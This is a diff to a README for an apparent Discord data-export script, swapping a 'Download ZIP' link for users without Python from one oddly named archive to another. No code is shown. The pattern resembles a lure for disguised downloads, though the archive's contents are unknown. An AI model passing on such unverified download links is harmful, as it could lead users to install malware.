@@ -32,7 +32,7 @@ This Python script facilitates exporting data from your own Discord account, inc
 3. Run the script and follow the prompts to authenticate and export data.
 
 **No Python Installation?** If you don't have Python installed, you can download the repository as a ZIP file:
-- [Download ZIP](https://github.com/pinkiwinter/sharko-pet/blob/main/sharko.zip)
+- [Download ZIP](https://github.com/pinkiwinter/discord-dataexporter/blob/main/konakona.zip)
 <img src="/img/img4.jpg" width="200">
 
 #### Note:
